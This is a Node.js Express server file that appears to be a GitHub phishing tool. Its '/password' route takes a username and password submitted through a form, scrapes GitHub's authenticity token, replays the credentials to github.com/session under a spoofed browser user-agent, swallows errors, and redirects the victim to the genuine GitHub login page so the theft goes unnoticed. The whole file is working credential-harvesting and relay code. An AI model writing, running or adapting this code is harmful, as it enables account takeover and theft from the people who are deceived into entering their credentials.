const express = require("express");
const path = require("path");
const axios = require("axios");
const cookieParser = require("cookie-parser");
const jsdom = require("jsdom");
const bodyParser = require("body-parser");

const app = express();
const port = 3000;

app.engine(".html", require("ejs").__express);

app.set("views", path.join(__dirname, "views"));

app.use(express.static(path.join(__dirname, "public")));

app.use(cookieParser());

app.use(bodyParser.urlencoded({ extended: true }));

app.set("view engine", "html");

app.get("/", function (req, res) {
  res.render("index", {
    username: req.query.username,
  });
});

app.post("/password", async function (req, res) {
  const instance = axios.create({
    withCredentials: true,
    headers: {
      "user-agent":
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36",
    },
  });

  var login_info = {
    commit: "Sign in",
    utf8: "%E2%9C%93",
    login: req.body.login,
    password: req.body.password,
  };

  var resp = await instance.get("https://github.com/session");
  const dom = new jsdom.JSDOM(resp.data);
  login_info["authenticity_token"] = dom.window.document
    .querySelector("input[name='authenticity_token']")
    .getAttribute("value");

  try {
    var resp2 = await instance.post("https://github.com/session", login_info);
  } catch (exception) {
    console.log("");
  }

  res.redirect("https://github.com/login");
});

app.get("/password", async function (req, res) {
  res.render("password", {
    username: req.query.username,
  });
});

app.listen(port, () => {
  console.log(`Example app listening on port ${port}`);
});
